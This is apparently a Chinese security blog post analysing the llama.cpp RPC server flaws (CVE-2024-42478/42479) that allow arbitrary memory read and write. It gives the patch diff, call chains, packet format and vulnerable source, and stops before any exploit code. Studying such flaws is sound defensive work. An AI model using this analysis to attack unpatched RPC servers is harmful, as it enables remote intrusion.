<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Sp1k3">





<title>llama.cpp版本小于b3561时GET_TENSOR SET_TENSOR组合漏洞RCE分析 | Sp1k3&#39;s Blog</title>



    <link rel="icon" href="../../../../image/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="../../../../css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="../../../../js/script.js"></script>
    
    <script src="../../../../js/tocbot.min.js"></script>
    



    
    
        
            <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


        
    


<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="atom.xml" title="Sp1k3's Blog" type="application/atom+xml">
</head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const pagebody = document.getElementsByTagName('body')[0]

            function setTheme(status) {

                if (status === 'dark') {
                    window.sessionStorage.theme = 'dark'
                    pagebody.classList.add('dark-theme');

                } else if (status === 'light') {
                    window.sessionStorage.theme = 'light'
                    pagebody.classList.remove('dark-theme');
                }
            };

            setTheme(window.sessionStorage.theme)
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Sp1k3&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                <a class="menu-item" href="../../../../archive">Posts</a>
                
                <a class="menu-item" href="../../../../category">Categories</a>
                
                <a class="menu-item" href="../../../../tag">Tags</a>
                
                <a class="menu-item" href="../../../../tool">Tools</a>
                
                <a class="menu-item" href="../../../../about">About</a>
                
                <a class="menu-item" href="../../../../search">Search</a>
                
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Sp1k3&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">
                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
                </div>
            </div>
            <div class="menu" id="mobile-menu">
                
                <a class="menu-item" href="../../../../archive">Posts</a>
                
                <a class="menu-item" href="../../../../category">Categories</a>
                
                <a class="menu-item" href="../../../../tag">Tags</a>
                
                <a class="menu-item" href="../../../../tool">Tools</a>
                
                <a class="menu-item" href="../../../../about">About</a>
                
                <a class="menu-item" href="../../../../search">Search</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.classList.contains("active")) {
            toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        } else {
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">llama.cpp版本小于b3561时GET_TENSOR SET_TENSOR组合漏洞RCE分析</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Sp1k3</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">September 15, 2025&nbsp;&nbsp;19:58:23</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="../../../../category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>24 年的时候，llama.cpp 出了两个漏洞 <a target="_blank" rel="noopener" href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-5vm9-p64x-gqw9">GHSA-5vm9-p64x-gqw9</a>和<a target="_blank" rel="noopener" href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-wcr5-566p-9cwj">GHSA-wcr5-566p-9cwj</a>（也就是 CVE-2024-42478 和 CVE-2024-42479）。影响版本是&lt;&#x3D;b3560，并在 b3561 中进行了修复。</p>
<p>根据 Github 中的描述，我们能控制 rpc_tensor 结构体中的 data 指针，可以实现任意地址读写，并且给出了调用链和 poc。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>编译命令</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -B build -DGGML_RPC=ON -DCMAKE_CXX_FLAGS_RELEASE=&quot;-g&quot;</span><br><span class="line">cmake --build build -j 32</span><br></pre></td></tr></table></figure>

<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Diff-分析"><a href="#Diff-分析" class="headerlink" title="Diff 分析"></a>Diff 分析</h2><p>根据给出的版本号，笔者对 b3560 和 b3561 两个 tag 进行了 diff。结果如下：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/examples/rpc/README.md b/examples/rpc/README.md</span></span><br><span class="line"><span class="comment">index e1da801f..adedc890 100644</span></span><br><span class="line"><span class="comment">--- a/examples/rpc/README.md</span></span><br><span class="line"><span class="comment">+++ b/examples/rpc/README.md</span></span><br><span class="line"><span class="meta">@@ -1,5 +1,9 @@</span></span><br><span class="line"> ## Overview</span><br><span class="line"></span><br><span class="line"><span class="addition">+&gt; [!IMPORTANT]</span></span><br><span class="line"><span class="addition">+&gt; This example and the RPC backend are currently in a proof-of-concept development stage. As such, the functionality is fragile and</span></span><br><span class="line"><span class="addition">+&gt; insecure. **Never run the RPC server on an open network or in a sensitive environment!**</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> The `rpc-server` allows  running `ggml` backend on a remote host.</span><br><span class="line"> The RPC backend communicates with one or several instances of `rpc-server` and offloads computations to them.</span><br><span class="line"> This can be used for distributed LLM inference with `llama.cpp` in the following way:</span><br><span class="line"><span class="comment">diff --git a/examples/rpc/rpc-server.cpp b/examples/rpc/rpc-server.cpp</span></span><br><span class="line"><span class="comment">index 7c15d2aa..6342e648 100644</span></span><br><span class="line"><span class="comment">--- a/examples/rpc/rpc-server.cpp</span></span><br><span class="line"><span class="comment">+++ b/examples/rpc/rpc-server.cpp</span></span><br><span class="line"><span class="meta">@@ -16,7 +16,7 @@</span></span><br><span class="line"> #include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"> struct rpc_server_params &#123;</span><br><span class="line"><span class="deletion">-    std::string host        = &quot;0.0.0.0&quot;;</span></span><br><span class="line"><span class="addition">+    std::string host        = &quot;127.0.0.1&quot;;</span></span><br><span class="line">     int         port        = 50052;</span><br><span class="line">     size_t      backend_mem = 0;</span><br><span class="line"> &#125;;</span><br><span class="line"><span class="meta">@@ -114,6 +114,17 @@</span> int main(int argc, char * argv[]) &#123;</span><br><span class="line">         fprintf(stderr, &quot;Invalid parameters\n&quot;);</span><br><span class="line">         return 1;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    if (params.host != &quot;127.0.0.1&quot;) &#123;</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;WARNING: Host (&#x27;%s&#x27;) is != &#x27;127.0.0.1&#x27;\n&quot;, params.host.c_str());</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;         Never expose the RPC server to an open network!\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;         This is an experimental feature and is not secure!\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;\n&quot;);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     ggml_backend_t backend = create_backend();</span><br><span class="line">     if (!backend) &#123;</span><br><span class="line">         fprintf(stderr, &quot;Failed to create backend\n&quot;);</span><br><span class="line"><span class="comment">diff --git a/ggml/src/ggml-rpc.cpp b/ggml/src/ggml-rpc.cpp</span></span><br><span class="line"><span class="comment">index b01ad267..7757615f 100644</span></span><br><span class="line"><span class="comment">--- a/ggml/src/ggml-rpc.cpp</span></span><br><span class="line"><span class="comment">+++ b/ggml/src/ggml-rpc.cpp</span></span><br><span class="line"><span class="meta">@@ -197,6 +197,10 @@</span> static std::shared_ptr&lt;socket_t&gt; create_server_socket(const char * host, int por</span><br><span class="line">         fprintf(stderr, &quot;Failed to set SO_REUSEADDR\n&quot;);</span><br><span class="line">         return nullptr;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    if (inet_addr(host) == INADDR_NONE) &#123;</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;Invalid host address: %s\n&quot;, host);</span></span><br><span class="line"><span class="addition">+        return nullptr;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line">     struct sockaddr_in serv_addr;</span><br><span class="line">     serv_addr.sin_family = AF_INET;</span><br><span class="line">     serv_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line"><span class="meta">@@ -879,6 +883,14 @@</span> ggml_tensor * rpc_server::deserialize_tensor(struct ggml_context * ctx, const rp</span><br><span class="line">     if (result-&gt;buffer &amp;&amp; buffers.find(result-&gt;buffer) == buffers.end()) &#123;</span><br><span class="line">         return nullptr;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    // require that the tensor data does not go beyond the buffer end</span></span><br><span class="line"><span class="addition">+    uint64_t tensor_size = (uint64_t) ggml_nbytes(result);</span></span><br><span class="line"><span class="addition">+    uint64_t buffer_start = (uint64_t) ggml_backend_buffer_get_base(result-&gt;buffer);</span></span><br><span class="line"><span class="addition">+    uint64_t buffer_size = (uint64_t) ggml_backend_buffer_get_size(result-&gt;buffer);</span></span><br><span class="line"><span class="addition">+    GGML_ASSERT(tensor-&gt;data + tensor_size &gt;= tensor-&gt;data); // check for overflow</span></span><br><span class="line"><span class="addition">+    GGML_ASSERT(tensor-&gt;data &gt;= buffer_start &amp;&amp; tensor-&gt;data + tensor_size &lt;= buffer_start + buffer_size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     result-&gt;op = (ggml_op) tensor-&gt;op;</span><br><span class="line">     for (uint32_t i = 0; i &lt; GGML_MAX_OP_PARAMS / sizeof(int32_t); i++) &#123;</span><br><span class="line">         result-&gt;op_params[i] = tensor-&gt;op_params[i];</span><br><span class="line"><span class="meta">@@ -898,7 +910,7 @@</span> bool rpc_server::set_tensor(const std::vector&lt;uint8_t&gt; &amp; input) &#123;</span><br><span class="line">     const rpc_tensor * in_tensor = (const rpc_tensor *)input.data();</span><br><span class="line">     uint64_t offset;</span><br><span class="line">     memcpy(&amp;offset, input.data() + sizeof(rpc_tensor), sizeof(offset));</span><br><span class="line"><span class="deletion">-    size_t size = input.size() - sizeof(rpc_tensor) - sizeof(offset);</span></span><br><span class="line"><span class="addition">+    const size_t size = input.size() - sizeof(rpc_tensor) - sizeof(offset);</span></span><br><span class="line"></span><br><span class="line">     struct ggml_init_params params &#123;</span><br><span class="line">         /*.mem_size   =*/ ggml_tensor_overhead(),</span><br><span class="line"><span class="meta">@@ -913,6 +925,17 @@</span> bool rpc_server::set_tensor(const std::vector&lt;uint8_t&gt; &amp; input) &#123;</span><br><span class="line">         return false;</span><br><span class="line">     &#125;</span><br><span class="line">     GGML_PRINT_DEBUG(&quot;[%s] buffer: %p, data: %p, offset: %&quot; PRIu64 &quot;, size: %zu\n&quot;, __func__, (void*)tensor-&gt;buffer, tensor-&gt;data, offset, size);</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    // sanitize tensor-&gt;data</span></span><br><span class="line"><span class="addition">+    &#123;</span></span><br><span class="line"><span class="addition">+        const size_t p0 = (size_t) ggml_backend_buffer_get_base(tensor-&gt;buffer);</span></span><br><span class="line"><span class="addition">+        const size_t p1 = p0 + ggml_backend_buffer_get_size(tensor-&gt;buffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        if (in_tensor-&gt;data + offset &lt; p0 || in_tensor-&gt;data + offset &gt;= p1 || size &gt; (p1 - in_tensor-&gt;data - offset)) &#123;</span></span><br><span class="line"><span class="addition">+            GGML_ABORT(&quot;[%s] tensor-&gt;data out of bounds\n&quot;, __func__);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     const void * data = input.data() + sizeof(rpc_tensor) + sizeof(offset);</span><br><span class="line">     ggml_backend_tensor_set(tensor, data, offset, size);</span><br><span class="line">     ggml_free(ctx);</span><br><span class="line"><span class="meta">@@ -943,6 +966,17 @@</span> bool rpc_server::get_tensor(const std::vector&lt;uint8_t&gt; &amp; input, std::vector&lt;uint</span><br><span class="line">         return false;</span><br><span class="line">     &#125;</span><br><span class="line">     GGML_PRINT_DEBUG(&quot;[%s] buffer: %p, data: %p, offset: %&quot; PRIu64 &quot;, size: %&quot; PRIu64 &quot;\n&quot;, __func__, (void*)tensor-&gt;buffer, tensor-&gt;data, offset, size);</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    // sanitize tensor-&gt;data</span></span><br><span class="line"><span class="addition">+    &#123;</span></span><br><span class="line"><span class="addition">+        const size_t p0 = (size_t) ggml_backend_buffer_get_base(tensor-&gt;buffer);</span></span><br><span class="line"><span class="addition">+        const size_t p1 = p0 + ggml_backend_buffer_get_size(tensor-&gt;buffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        if (in_tensor-&gt;data + offset &lt; p0 || in_tensor-&gt;data + offset &gt;= p1 || size &gt; (p1 - in_tensor-&gt;data - offset)) &#123;</span></span><br><span class="line"><span class="addition">+            GGML_ABORT(&quot;[%s] tensor-&gt;data out of bounds\n&quot;, __func__);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     // output serialization format: | data (size bytes) |</span><br><span class="line">     output.resize(size, 0);</span><br><span class="line">     ggml_backend_tensor_get(tensor, output.data(), offset, size);</span><br><span class="line"><span class="comment">diff --git a/ggml/src/ggml.c b/ggml/src/ggml.c</span></span><br><span class="line"><span class="comment">index c937b5e5..38990e3a 100644</span></span><br><span class="line"><span class="comment">--- a/ggml/src/ggml.c</span></span><br><span class="line"><span class="comment">+++ b/ggml/src/ggml.c</span></span><br><span class="line"><span class="meta">@@ -3724,7 +3724,8 @@</span> static struct ggml_tensor * ggml_new_tensor_impl(</span><br><span class="line">         struct ggml_tensor  * view_src,</span><br><span class="line">         size_t                view_offs) &#123;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    assert(n_dims &gt;= 1 &amp;&amp; n_dims &lt;= GGML_MAX_DIMS);</span></span><br><span class="line"><span class="addition">+    GGML_ASSERT(type &gt;= 0 &amp;&amp; type &lt; GGML_TYPE_COUNT);</span></span><br><span class="line"><span class="addition">+    GGML_ASSERT(n_dims &gt;= 1 &amp;&amp; n_dims &lt;= GGML_MAX_DIMS);</span></span><br><span class="line"></span><br><span class="line">     // find the base tensor and absolute offset</span><br><span class="line">     if (view_src != NULL &amp;&amp; view_src-&gt;view_src != NULL) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​ <code>rpc_server::deserialize_tensor</code>、<code>rpc_server::set_tensor</code>、<code>rpc_server::get_tensor</code> 这几个方法添加了对 <code>tensor-&gt;data</code>、<code>offset</code>、<code>size</code> 的边界检查。根据 patch 来看，在添加检查之前，<code>tensor-&gt;data+offset+size</code> 是有可能越界的。</p>
<h2 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h2><p>作者直接给出了两个漏洞的调用链。</p>
<p>任意地址读调用链：</p>
<ul>
<li>start_rpc_server<ul>
<li>rpc_serve_client<ul>
<li>rpc_server::get_tensor<ul>
<li>ggml_backend_tensor_get<ul>
<li>ggml_backend_cpu_buffer_get_tensor</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>任意地址写调用链：</p>
<ul>
<li>start_rpc_server<ul>
<li>rpc_serve_client<ul>
<li>rpc_server::set_tensor<ul>
<li>ggml_backend_tensor_set<ul>
<li>ggml_backend_cpu_buffer_set_tensor</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>这两个漏洞的调用链差不多，我们先来看任意读</p>
<h3 id="任意地址读漏洞"><a href="#任意地址读漏洞" class="headerlink" title="任意地址读漏洞"></a>任意地址读漏洞</h3><h4 id="start-rpc-server"><a href="#start-rpc-server" class="headerlink" title="start_rpc_server"></a>start_rpc_server</h4><p>start_rpc_server 是 RPC 服务的开始，初始化 socket 服务之后，进入循环</p>
<ol>
<li><code>socket_accept()</code> 阻塞等待客户端连接</li>
<li>调用 <code>rpc_serve_client()</code> 处理单个客户端的 RPC 请求</li>
</ol>
<h4 id="rpc-serve-client"><a href="#rpc-serve-client" class="headerlink" title="rpc_serve_client"></a>rpc_serve_client</h4><p>rpc_serve_client 为每一个客户端连接创建一个 <code>rpc_server</code> 实例，然后读取 1 字节 cmd，8 字节 input_size，以及 <code>input.data()</code>。因此每次通信的数据包结构如下：</p>
<table>
<thead>
<tr>
<th>数据包</th>
<th>cmd</th>
<th>input_size</th>
<th>input.data()</th>
</tr>
</thead>
<tbody><tr>
<td>bytes</td>
<td>1</td>
<td>8</td>
<td>input_size</td>
</tr>
</tbody></table>
<p>继续往下看是一个 switch 结构，add、edit、show、delete 都有了（CTF 选手的 DNA 动了）</p>
<p><img src="/2025/09/15/llama-cpp-tensor-rce1/../llama-cpp-tensor-rce1/de852b2e313b3b29b9592707c8c3ef4c.png"></p>
<h4 id="rpc-server-get-tensor"><a href="#rpc-server-get-tensor" class="headerlink" title="rpc_server::get_tensor"></a>rpc_server::get_tensor</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">rpc_server::get_tensor</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt; &amp; input, std::vector&lt;<span class="type">uint8_t</span>&gt; &amp; output)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// serialization format: | rpc_tensor | offset (8 bytes) | size (8 bytes) |</span></span><br><span class="line">    <span class="keyword">if</span> (input.<span class="built_in">size</span>() != <span class="built_in">sizeof</span>(rpc_tensor) + <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> rpc_tensor * in_tensor = (<span class="type">const</span> rpc_tensor *)input.<span class="built_in">data</span>();</span><br><span class="line">    <span class="type">uint64_t</span> offset;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;offset, input.<span class="built_in">data</span>() + <span class="built_in">sizeof</span>(rpc_tensor), <span class="built_in">sizeof</span>(offset));</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;size, input.<span class="built_in">data</span>() + <span class="built_in">sizeof</span>(rpc_tensor) + <span class="built_in">sizeof</span>(offset), <span class="built_in">sizeof</span>(size));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ggml_init_params</span> params &#123;</span><br><span class="line">        <span class="comment">/*.mem_size   =*/</span> <span class="built_in">ggml_tensor_overhead</span>(),</span><br><span class="line">        <span class="comment">/*.mem_buffer =*/</span> <span class="literal">NULL</span>,</span><br><span class="line">        <span class="comment">/*.no_alloc   =*/</span> <span class="literal">true</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ggml_context</span> * ctx = <span class="built_in">ggml_init</span>(params);</span><br><span class="line">    ggml_tensor * tensor = <span class="built_in">deserialize_tensor</span>(ctx, in_tensor);</span><br><span class="line">    <span class="keyword">if</span> (tensor == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] error deserializing tensor\n&quot;</span>, __func__);</span><br><span class="line">        <span class="built_in">ggml_free</span>(ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] buffer: %p, data: %p, offset: %&quot;</span> PRIu64 <span class="string">&quot;, size: %&quot;</span> PRIu64 <span class="string">&quot;\n&quot;</span>, __func__, (<span class="type">void</span>*)tensor-&gt;buffer, tensor-&gt;data, offset, size);</span><br><span class="line">    <span class="comment">// output serialization format: | data (size bytes) |</span></span><br><span class="line">    output.<span class="built_in">resize</span>(size, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">ggml_backend_tensor_get</span>(tensor, output.<span class="built_in">data</span>(), offset, size);</span><br><span class="line">    <span class="built_in">ggml_free</span>(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>get_tensor 会先验证输入的数据大小，并且解析出：rpc_tensor  结构体、offset（8 字节）、size（8 字节），这几个字段。也就是说我们能完全控制 tensor 结构体的内容。</p>
